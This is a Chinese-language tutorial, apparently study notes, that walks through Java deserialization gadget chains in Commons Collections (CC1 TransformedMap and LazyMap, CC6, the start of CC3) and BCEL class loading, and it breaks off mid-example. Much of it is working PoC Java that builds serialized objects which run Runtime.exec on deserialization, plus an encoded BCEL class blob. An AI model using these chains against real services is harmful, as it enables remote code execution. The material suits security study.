$l$8b$I$A$A$A$A$A$A$AuQIN$c3$40$Q$acIL$ec$Y$87$40$m$ec$fb$g8$e0$L7$Q$X$E$S$c2$y$o$I$ce$93a$U$G$i$3br$s$I$5e$c4$99$L$m$O$3c$80G$nzLX$q$c0$92$bb$5d$dd$5d$d5$d5$f2$eb$db$f3$L$805$y$bap0$e4b$Y$p$OFM$k$b31$ee$a2$L$T6$smL1$e46T$a4$f4$sC$b6$b2$7c$ca$60m$c5$e7$92$a1$Y$a8H$k$b4$h5$99$9c$f0ZH$95R$Q$L$k$9e$f2D$Z$dc$vZ$faB$b5$Y$c6$C$R7$fcK$7e$cd$5bR$f8$b5$5b$z$F$a9$f8$db$d7$w$5cgp6D$d8$d9$c1$88S$O$cc$a0$afb$7f$f7p$fbF$c8$a6VqDc$85$aa$e6$e2j$9f7Sm$b2$c9$e0V$e3v$o$e4$8e2$bb$f2Fn$d5p$3d$e4$e1$da$98$f60$83Y2A$be$84$879$cc3$f4$ff$a1$eda$B$$$c3$c8$bf$k$ZzSZ$c8$a3$ba$7fX$bb$94B3$f4$7d$97$8e$db$91V$N$b2$e0$d6$a5$fe$C$e5$car$f0k$86$ee$b0$e4$8d$U$MK$95$l$dd$aaNTT_$ffI8Jb$n$5b$z$o$U$9b$d4$d4$e9$f5$t$J$X$92$ae$b2$e9$b7$99$t$Dfn$a5$d8M$c8$a7$cc$uw$ad$3c$82$dd$a7m$8fb$$$z$e6Q$a0$e8$7d$M$a0$HE$ca$Oz$bf$c8$3c$V$DJO$c8$94$b2$P$b0$ce$ee$e0$ec$ad$3c$mw$df$e1$7b$c4$cb$a6$8a$83$f4e$b4$f2$a4$e2$91n$81$f4$faH$ebsC$B$W$e1$S$a1$7ezmd$C$h$D$W5$ca$a9$a9$c1wE$c9U$ae$80$C$A$A
```

（2）使用BCEL ClassLoader进行加载：

```java
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import java.io.IOException;

public class BCEL_ {
   public static void main(String[] args) throws IOException, IllegalAccessException, ClassNotFoundException, InstantiationException {
       ClassLoader cl = new ClassLoader();
       System.out.println("cl的运行类型=" + cl.getClass());
       Class<?> c = cl.loadClass("$$BCEL$$" + "$l$8b...$A");
       c.newInstance();
  }
}
```

<img src=".\图片\Snipaste_2023-03-06_13-45-44.png" alt="Snipaste_2023-03-06_13-45-44" style="zoom:67%;" />

# CommonsCollections篇

<img src=".\图片\Snipaste_2023-03-03_14-44-39.png" alt="Snipaste_2023-03-03_14-44-39" style="zoom:80%;" />

## CC1 TransformedMap

需要注意CC1链的条件是：Commons-Collections <= 3.2.1，jdk<8u71

idea找实现类快捷键 `Ctrl+h`

### Transformer接口及实现类

这条链的作者发现的起点是一个Transformer接口，位于org.apache.commons.collections包中

transform意为转换，转化，transformer可理解为转换器、修饰器的意思

<img src=".\图片\Snipaste_2023-03-03_15-10-33.png" alt="Snipaste_2023-03-03_15-10-33" style="zoom:67%;" />

接下来看看它的实现类

#### 1.ChainedTransformer

简单来说就是当前的结果作为下一个步骤的输入，将最后的结果返回。有一种链式反应的感觉，故而叫ChainedTransformer（链式转化器）

<img src=".\图片\Snipaste_2023-03-03_15-17-22.png" alt="Snipaste_2023-03-03_15-17-22" style="zoom:67%;" />

#### 2.ConstantTransformer

ConstantTransformer 是实现了 Transformer 接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个 对象，并在transform⽅法将这个对象再返回，**transform方法是无视传入的对象，直接返回该iConstant**

```java
public ConstantTransformer(Object constantToReturn) {
 super();
 iConstant = constantToReturn;
}
public Object transform(Object input) {
 return iConstant;
}
```

#### 3.InvokerTransformer

理想的执行类，这个类可以⽤来执⾏任意⽅法，这也是反序列化能执⾏任意代码的关键

在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表：

```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[]
args) {
 super();
 iMethodName = methodName;
 iParamTypes = paramTypes;
 iArgs = args;
}
```

该类的 `transform(Object input)` 可调用任意类任意（非私有）方法，原理是反射调用，类似后门的写法

<img src=".\图片\Snipaste_2023-03-03_15-26-14.png" alt="Snipaste_2023-03-03_15-26-14" style="zoom:67%;" />

我们可以利用其执行计算器

```java
@Test
public void test_03() throws Exception {
    Runtime runtime = Runtime.getRuntime();
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(runtime);
}
```

### 寻找Gadget

我们已知终点是 `InvokerTransformer` 类中的 `transform()` 方法

#### 步骤1

1、简单调用 `transform()` 方法来试试执行命令

```java
@Test
public void test01(){
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(Runtime.getRuntime());
}
```

#### 步骤2

2、接下来寻找哪个类调用了 `InvokerTransformer`  类中的 `transform()` 方法（idea中选中右键点击`Find Usages`），我们优先寻找

哪里的readObject()方法里调用了，优先找其它类中调用了`transform()` 方法，还要其参数类型宽泛能容下`InvokerTransformer`。于是我们尝试找到了**TransformedMap**，因为首先它是Map系列，其次有多个方法调用到transform()，机会更多。

<img src=".\图片\Snipaste_2023-03-03_16-05-12.png" alt="Snipaste_2023-03-03_16-05-12" style="zoom: 80%;" />

**TransformedMap里，checkSetValue() 方法调用了 transform(）**

```java
protected Object checkSetValue(Object value) {
    return valueTransformer.transform(value);
}
```

TransformedMap的构造方法里，类似对keyTransformer和valueTransformer进行修饰，方便对其做操作

```java
protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;
}
```

TransformedMap的decorate()方法里，就是实例化TransformedMap()

```
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}
```

**bytheway：**

我们调用 TransformedMap 里的 put() 方法，put() 方法里调用到 transformValue(Object object) 方法，transformValue() 方法里就调用到了 valueTransformer.transform(object)，从而也可以达到命令执行

```
public Object put(Object key, Object value) {
        key = transformKey(key);
        value = transformValue(value);
        return getMap().put(key, value);
    }   
protected Object transformValue(Object object) {
        if (valueTransformer == null) {
            return object;
        }
        return valueTransformer.transform(object);
    }    
```

于是测试代码如下，触发命令执行

```java
@Test
//p牛cc1前置测试
public void test09(){
    Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.getRuntime()),
            new InvokerTransformer("exec", new Class[]{String.class},
                    new Object[]
                            {"calc"}),
    };
    Transformer transformerChain = new
            ChainedTransformer(transformers);
    Map innerMap = new HashMap();
    Map outerMap = TransformedMap.decorate(innerMap, null,
            transformerChain);
    outerMap.put("test", "xxxx");
}
```

#### 步骤3

3、再来寻找哪个类调用了checkSetValue()方法，发现抽象类 `AbstractInputCheckedMapDecorator `类里的 `MapEntry` 类里的 `setValue()` 方法里调用了checkSetValue()方法

<img src=".\图片\Snipaste_2023-03-03_16-25-17.png" alt="Snipaste_2023-03-03_16-25-17" style="zoom: 50%;" />

<img src=".\图片\Snipaste_2023-03-03_16-43-44.png" alt="Snipaste_2023-03-03_16-43-44" style="zoom:67%;" />

我们再联想，map有一种遍历方式能调用 `setValue()` 方法

```java
Map<String,String> map = new HashMap<>();
for (Map.Entry<String,String> entry : map.entrySet()) {
    String key = entry.getKey();
    String value = entry.getValue();
}
```

我们简单写下初步的POC，成功执行了命令

```java
 @Test
    public void test02(){
        Runtime r = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = (InvokerTransformer) new
                InvokerTransformer("exec", new Class[]{String.class}, new Object[]
                {"calc"});
        HashMap<Object, Object> map = new HashMap<Object, Object>();
        map.put("key", "value"); //设置map的值
        Map<Object, Object> TransformedMapMethod =
                TransformedMap.decorate(map, null, invokerTransformer);//静态方法类调用然后实例化
//invokerTransformer传⼊值
        for (Map.Entry entry : TransformedMapMethod.entrySet()) {//在map⾥⼀种遍历⽅式
            entry.setValue(r); //这⾥相当于invokerTransformer.transform(value);
            System.out.println(entry.getKey());
            System.out.println(entry.getValue());
        }
    }
```

`TransformedMap` 继承 `AbstractInputCheckedMapDecorator` ，`entry.setValue(Runtime.getRuntime())` 这里会调用`AbstractInputCheckedMapDecorator` 类中的 `checkSetValue()` 方法，于是调用`TransformedMap `中的 `checkSetValue()` 方法

<img src=".\图片\Snipaste_2023-03-04_10-54-24.png" alt="Snipaste_2023-03-04_10-54-24" style="zoom: 67%;" />

<img src=".\图片\Snipaste_2023-03-04_10-55-10.png" alt="Snipaste_2023-03-04_10-55-10" style="zoom: 67%;" />

#### 步骤4

4、刚才的POC只是我们测试用的。于是，我们如果找到一个**遍历集合地方**，其中调用了 `setValue()` 方法，最好这个`setValue()`在谁的 `readObject()` 方法里。于是起点: **AnnotationInvocationHandler** 类出现了，它的 `readObject()` 方法里调用集合遍历调用了`setValue()` 方法

```java
readObject(){
   for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            if () {  
                if ()  {
                    memberValue.setValue(...固定写死的)     
                }}}}
```

预想状态：反射出AnnotationInvocationHandler实例化对象o，在serialize 和unserializa，便可以执行命令

```java
@Test
public void test_06() throws Exception {
    Runtime r = Runtime.getRuntime();
    InvokerTransformer invokerTransformer = (InvokerTransformer) new
            InvokerTransformer("exec", new Class[]{String.class}, new Object[]
            {"calc"});
    HashMap<Object, Object> map = new HashMap<Object, Object>();
    map.put("key", "value"); //设置map的值
    Map<Object, Object> TransformedMapMethod =
            TransformedMap.decorate(map, null, invokerTransformer);
    
    Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor<?> annotationInvocationConstructor =
            c.getDeclaredConstructor(Class.class, Map.class);
    annotationInvocationConstructor.setAccessible(true);
    Object o = annotationInvocationConstructor.newInstance(Override.class, TransformedMapMethod);
    serialize(o);
    unserialize();
}
```

#### 问题

**问题1:**
Runtime类没有实现Serializable接口，而`Class`类实现Serializable接口。需要调用InvokerTransformer版本的执行命令，先看看Class类基础的反射执行命令

```java
    @Test
    public void test_13() throws Exception {
        Class clazz = Class.forName("java.lang.Runtime");
        Method getRuntimeMethod = clazz.getMethod("getRuntime",null);
        Runtime runtime = (Runtime)getRuntimeMethod.invoke(null,null);
        Method execMethod = clazz.getMethod("exec", String.class);
        execMethod.invoke(runtime, "calc.exe");
    }
```

再改为InvokerTransformer版本的执行命令

```java
@Test
public void test_08() throws Exception {
    Method getRuntimeMethod =(Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
    Runtime r=(Runtime)new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntimeMethod);
    new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);
}
```

我们还可以用 `ChainedTransformer` 递归调用优化

```java
 @Test
    public void test_09() throws Exception {
        Transformer[] transformers =new Transformer[]{
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(Runtime.class);
    }
```

我们再整理一下，发现还是不能成功

```java
    @Test
    public void test_07() throws Exception {
        Transformer[] transformers =new Transformer[]{
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<Object, Object>();
        map.put("key", "value"); //设置map的值
        Map<Object, Object> TransformedMapMethod =
                TransformedMap.decorate(map, null, chainedTransformer);
        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> annotationInvocationConstructor =
                c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationConstructor.setAccessible(true);
        Object o = annotationInvocationConstructor.newInstance(Override.class, TransformedMapMethod);
        serialize(o);
        unserialize();
    }
```

**问题2：**

入口类AnnotationInvocationHandler的readObject()方法里，这里的两个if我们进不去

```java
for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
    String name = memberValue.getKey();
    Class<?> memberType = memberTypes.get(name);
    if (memberType != null) {  // i.e. member still exists
        Object value = memberValue.getValue();
        if (!(memberType.isInstance(value) ||
              value instanceof ExceptionProxy)) {
            memberValue.setValue(
                new AnnotationTypeMismatchExceptionProxy(
                    value.getClass() + "[" + value + "]").setMember(
                        annotationType.members().get(name)));
        }
    }
}
```

要过两个 if ，我们 map.put("value", "s") 的 key == Target 注解中的value()变量名，或者key == 其它注解中的其它变量名

**问题3：**

原本 `memberValue.setValue(`）里为固定值 ，我们要改变 setValue(）里的固定值，运用 ConstantTransformer ，该类维护了一个iConstant恒定不变的Object对象，是由创建时通过构造器传入，其transform方法是无视传入的对象，直接返回该iConstant

```
 memberValue.setValue(
                new AnnotationTypeMismatchExceptionProxy(
                    value.getClass() + "[" + value + "]").setMember(
                        annotationType.members().get(name)));
```

最终payload

```java
@Test
public void test_10() throws Exception {
    Transformer[] transformers =new Transformer[]{
            new ConstantTransformer(Runtime.class),//进入第二个if
            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

    HashMap<Object, Object> map = new HashMap<Object, Object>();
    map.put("value", "s"); //设置map的key == Target 注解中的value()方法名
    Map<Object, Object> TransformedMapMethod =
            TransformedMap.decorate(map, null, chainedTransformer);
    Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor<?> annotationInvocationConstructor =
            c.getDeclaredConstructor(Class.class, Map.class);
    annotationInvocationConstructor.setAccessible(true);
    Object o = annotationInvocationConstructor.newInstance(Target.class, TransformedMapMethod);
    serialize(o);
    unserialize();
}
```

### 总结利用链：

```
InvokerTransformer.transform()<--TransformedMap.checkSetValue().transform()<--AbstractInputCheckedMapDecorator.MapEntry.setValue()<--AnnotationInvocationHandler.readObject().MapEntry.setValue()
```

## CC1 LazyMap

需要注意CC1链的条件是：Commons-Collections <= 3.2.1，jdk<8u71

### Java对象动态代理

作为一门静态语言，如果想劫持一个对象内部的方法调用，实现类似PHP的魔术方法 __call ，我们需 要用到 java.reflect.Proxy ：

```java
Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new
Class[] {Map.class}, handler);
```

`Proxy.newProxyInstance` 的第一个参数是ClassLoader，我们用默认的即可；第二个参数是我们需要 代理的对象集合；第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻辑。 比如，我们写这样一个类 ExampleInvocationHandler：

```java
package org.example.p_god;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.Map;
public class ExampleInvocationHandler implements InvocationHandler {
    protected Map map;
    public ExampleInvocationHandler(Map map) {
        this.map = map;
    }
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws
            Throwable {
        if (method.getName().compareTo("get") == 0) { //监控到调用的方法名是 get
            System.out.println("Hook method: " + method.getName());
            return "Hacked Object";
        }
        return method.invoke(this.map, args);
    }
}
```

`ExampleInvocationHandler` 类实现了 `invoke` 方法（动态代理⽅法在执行时 invoke ⽅法会执⾏），作用是在监控到调用的方法名是 get 的时候，返回一 个特殊字符串 Hacked Object 。 在外部调用这个 ExampleInvocationHandler：

```java
package org.example.p_god;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
public class App {
    public static void main(String[] args) throws Exception {
        InvocationHandler handler = new ExampleInvocationHandler(new
                HashMap());
        Map proxyMap = (Map)
                Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class},
                        handler);
        proxyMap.put("hello", "world");
        String result = (String) proxyMap.get("hello"); //调用的方法名为 get
        System.out.println(result);
    }
}
```

运行 App，我们可以发现，虽然我向Map放入的 hello 值为 world，但我们获取到的结果却是 Hacked Object ：

<img src=".\图片\Snipaste_2023-03-04_11-38-12.png" alt="Snipaste_2023-03-04_11-38-12" style="zoom:80%;" />

在本条链中，会发现实际上 `sun.reflect.annotation.AnnotationInvocationHandler` 这个类实际就 是一个 InvocationHandler，我们如果将这个对象用Proxy进行代理，那么在readObject的时候，只要 调用任意方法，就会进入 AnnotationInvocationHandler#invoke 方法中，进而触发我们的 LazyMap#get 。

### 过程分析

这里放上一张对比图，看看之前利用的 `TransformedMap` 链与这里的 `LazyMap` 链的比对

<img src=".\图片\cc.png" alt="cc" style="zoom: 80%;" />

之前 TransformedMap 链的 Gadget 如下：

```
InvokerTransformer.transform()<--TransformedMap.checkSetValue().transform()<--AbstractInputCheckedMapDecorator.MapEntry.setValue()<--AnnotationInvocationHandler.readObject().MapEntry.setValue()
```

我们发现 LazyMap 链中的起点与终点其实与 TransformedMap 链中的一样，只不过中间换成了 LazyMap

#### LazyMap

先看源码

```java
public class LazyMap
        extends AbstractMapDecorator
        implements Map, Serializable {
    private static final long serialVersionUID = 7990956402564206740L;
    protected final Transformer factory;

    public static Map decorate(Map map, Factory factory) {
        return new org.apache.commons.collections.map.LazyMap(map, factory);
    }

    public static Map decorate(Map map, Transformer factory) {
        return new org.apache.commons.collections.map.LazyMap(map, factory);
    }

    protected LazyMap(Map map, Factory factory) {
        super(map);
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be null");
        }
        this.factory = FactoryTransformer.getInstance(factory);
    }

    protected LazyMap(Map map, Transformer factory) {
        super(map);
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be null");
        }
        this.factory = factory;
    }

    private void writeObject(ObjectOutputStream out) throws IOException {
        out.defaultWriteObject();
        out.writeObject(map);
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        map = (Map) in.readObject();
    }

    public Object get(Object key) {
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
}
```

实现了 Serializable 接口，**可序列化**；有一个Transformer类型的factory属性，构造器为protected的，但可通过 `decorate()` 方法获取到一个 LazyMap，这与TransformedMap很类似。

重点看 **get()** 方法：LazyMap的漏洞触发点和TransformedMap唯一的差别是，TransformedMap是在写入元素的时候执行 transform ，而 LazyMap 是在其 get 方法中执行的 factory.transform 。其实这也好理解，LazyMap 的作用是“懒加载”，在get找不到值的时候，它会调用 factory.transform 方法去获取一个值：

```java
public Object get(Object key) {
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
```

先简单测试下Payload并弹出计算器：

```java
@Test
public void test_13() throws Exception {
    Transformer[] transformers =new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

    HashMap<Object,Object> map =  new HashMap<Object,Object>();
    Map<Object,Object> lazymap= LazyMap.decorate(map,chainedTransformer);
    lazymap.get("ss");
}
```

接下来我们要寻找那些地方调用到 `get()`

#### 寻找利用链

直接看原作者找到了又是 `sun.reflect.annotation.AnnotationInvocationHandler`

学了动态代理，当我们再来看这个类时，它不仅可以序列化，而且还实现了InvocationHandler接口

```java
class AnnotationInvocationHandler implements InvocationHandler, Serializable{...}
```

关键 invoke() 方法：

会先得到调用的方法名member，参数类型paramTypes，然后判断是否为equals，toString，hashCode，annotationType 方法，如果不是那就会调用memberValues.get()，而memberValues为一个Map。假如这里的memberValues为LazyMap，那么只要不满足前面的if条件且LazyMap中键名没有和调用方法名一样的，就会进入到我们构造的链子中。

```java
public Object invoke(Object proxy, Method method, Object[] args) {
    String member = method.getName();
    Class<?>[] paramTypes = method.getParameterTypes();

    // Handle Object and Annotation methods
    if (member.equals("equals") && paramTypes.length == 1 &&
        paramTypes[0] == Object.class)
        return equalsImpl(args[0]);
    assert paramTypes.length == 0;
    if (member.equals("toString"))
        return toStringImpl();
    if (member.equals("hashCode"))
        return hashCodeImpl();
    if (member.equals("annotationType"))
        return type;

    // Handle annotation member accessors
    Object result = memberValues.get(member); //这里调用了get()
    if (result == null)
        throw new IncompleteAnnotationException(type, member);
    if (result instanceof ExceptionProxy)
        throw ((ExceptionProxy) result).generateException();
    if (result.getClass().isArray() && Array.getLength(result) != 0)
        result = cloneArray(result);
    return result;
}
```

接下来使用动态代理来调用 invoke() 方法

我们回看 sun.reflect.annotation.AnnotationInvocationHandler ，会发现实际上这个类实际就 是一个InvocationHandler，我们如果将这个对象用Proxy 进行代理，那么在readObject的时候，只要调用任意方法，就会进入到 AnnotationInvocationHandler#invoke 方法中，进而触发我们的 LazyMap#get 。

加上动态代理后的最终 payload ：

```java
@Test
public void test_12() throws Exception {
    Transformer[] transformers =new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

    HashMap<Object,Object> map =  new HashMap<Object,Object>();
    Map<Object,Object> lazymap= LazyMap.decorate(map,chainedTransformer);
    Class c=  Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor constructor= c.getDeclaredConstructor(Class.class,Map.class);
    constructor.setAccessible(true);
     
    //动态代理执行 invoke()
    InvocationHandler annotationInvocationHandler = (InvocationHandler)constructor.newInstance(Target.class, lazymap);
    Map  proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},annotationInvocationHandler);
    
    Object obj = constructor.newInstance(Target.class, proxymap);

    serialize(obj);
    unserialize();
}
```

<img src=".\图片\Snipaste_2023-03-04_12-30-56.png" alt="Snipaste_2023-03-04_12-30-56" style="zoom: 50%;" />

### 总结利用链：

```
InvokerTransformer.transform()<--LazyMap.get()<--AnnotationInvocationHandler.invoke()<--Map(Proxy).entrySet()<--AnnotationInvocationHandler.readObject()
```

### LazyMap与TransformedMap的对比

前面我们详细分析了LazyMap的作用并构造了POC，但是和上一篇文章中说过的那样，LazyMap仍然无法解决 CommonCollections1 这条利用链在高版本Java（8u71以后）中的使用问题。 

jdk8u71以后，把 `AnnotationInvocationHandler.readObject()` 里的 setValue 给弄没了，所以CC1 的 TransformedMap 链不行了

LazyMap的漏洞触发在get和invoke中，完全没有 setValue 什么事，这也说明8u71后不能利用的原因和 AnnotationInvocationHandler#readObject 中有没有setValue没任何关系

## CC6

之前两条CC1链都只能在JDK8u71之前使用，而 CC6 链是一条比较通杀的链子，可以无视JDK版本。

<img src=".\图片\cc改.png" alt="cc改" style="zoom: 67%;" />

### 分析思路

CC1 里，LazyMap.get(）方法中会调用factory.transform(key)，factory为一个Transformer类型，让其为我们构造的ChainedTransformer对象就可以触发链子执行任意命令。

```java
    public Object get(Object key) {
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key); //这里调用
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
```

接下来就是与 CC1 不同的地方了，还有哪里调用到 get() 方法呢？期望的是哪里的 readObject() 方法里调用了哪些方法，而这些方法里又调用了 get() 方法，方法的参数类型还得宽泛。

于是我们找到了 TiedMapEntry 类

#### TiedMapEntry类

TiedMapEntry 可序列化

```java
public class TiedMapEntry implements Map.Entry, KeyValue, Serializable {...}
```

getValue() 方法可调用到 get(key）

```java
public Object getValue() {
    return map.get(key);
}
```

hashCode() 方法里又调用到了 getValue() 方法

```java
public int hashCode() {
    Object value = getValue();
    return (getKey() == null ? 0 : getKey().hashCode()) ^
           (value == null ? 0 : value.hashCode()); 
}
```

其实到这里已经很明显了，跟之前的 URLDNS 链的起点 一模一样，都是 HashMap 里的readObject().hash(key)调用了 key.hashcode()

#### 起点HashMap

HashMap 中的 readObject() 方法里调用了 hash(key)

<img src=".\图片\Snipaste_2023-03-04_13-32-12.png" alt="Snipaste_2023-03-04_13-32-12" style="zoom: 67%;" />

hash(key) 方法里调用了 key.hashcode()

<img src=".\图片\Snipaste_2023-03-04_13-34-49.png" alt="Snipaste_2023-03-04_13-34-49" style="zoom:67%;" />

### 编写payload

#### 预想

期望以下在**反序列化时会执行命令**，可是**此时在序列化时就已经执行了计算器**，原理还是跟之前 URLDNS链分析的一样，调用 `map2.put(tiedMapEntry,"value")`  时会直接执行 `hash(tiedMapEntry)` 从而 `tiedMapEntry.hashcode()` 从而执行命令

<img src=".\图片\Snipaste_2023-03-04_13-48-41.png" alt="Snipaste_2023-03-04_13-48-41" style="zoom:67%;" />

```java
 @Test //cc6测试
    public void test_15() throws Exception {
        Transformer[] transformers =new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> map =  new HashMap<Object,Object>();
        Map<Object,Object> lazymap= LazyMap.decorate(map,chainedTransformer);

        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazymap,"key");
        HashMap map2=new HashMap();
        map2.put(tiedMapEntry,"value");

        serialize(map2);
//        unserialize();
    }
```

#### 改进

```java
@Test  //CC6
public void test_14() throws Exception {
    Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
    };
    Transformer transformerChain = new ChainedTransformer(transformers);
    
    Map lazyMap = LazyMap.decorate(new HashMap(), new ConstantTransformer(1)); //先不传入transformerChain，而是传入无害的new ConstantTransformer(1) 避免put时就弹计算器

    TiedMapEntry tiedMapEntry=new  TiedMapEntry(lazyMap,"key");
    HashMap hashMap=new HashMap();
    hashMap.put(tiedMapEntry,"value");//put时会调用链子，从而进入LazyMap.get()，此时没弹计算器是因为我们传入了人畜无害的 new ConstantTransformer(1)。同时此时会往LazyMap的map中写入键值对("xxx",1)，从而使得在反序列化时，LazyMap的map属性中有了"xxx"这个键名，就不会进入到if条件，反序列化时也就进入不到transformers数组执行命令了
    
    lazyMap.remove("key");   //在put后移除掉lazyMap中的"xxx"这个键名就可以了
    
    Class c = LazyMap.class;
    Field factoryfield = c.getDeclaredField("factory");
    factoryfield.setAccessible(true);
    factoryfield.set(lazyMap,transformerChain);       ////反射把 transformerChain 改回来

    serialize(hashMap);
    unserialize();
}
```

put时会调用链子，从而进入LazyMap.get()，此时没弹计算器是因为我们传入了人畜无害的 new ConstantTransformer(1)。同时此时会往LazyMap的map中写入键值对("xxx",1)，从而使得在反序列化时，LazyMap的map属性中有了"xxx"这个键名，就不会进入到if条件，反序列化时也就进入不到transformers数组执行命令了

<img src=".\图片\Snipaste_2023-03-04_14-11-11.png" alt="Snipaste_2023-03-04_14-11-11" style="zoom:67%;" />

### 总结利用链：

```
InvokerTransformer.transform()<--LazyMap.get()<--TiedMapEntry.getValue().get(key)<--TiedMapEntry.hashCode().getValue()<--HashMap.readObject().hash(key).hashcode()
```

## CC3

利用 TemplatesImpl 动态加载字节码换一种命令执行的方式，在之前的 CC1、CC6上改变终点

<img src=".\图片\Snipaste_2023-03-06_14-50-41.png" alt="Snipaste_2023-03-06_14-50-41" style="zoom:80%;" />

### TemplatesImpl CC1

demo： 

```java
@Test
public void test01() throws NoSuchFieldException, IllegalAccessException {
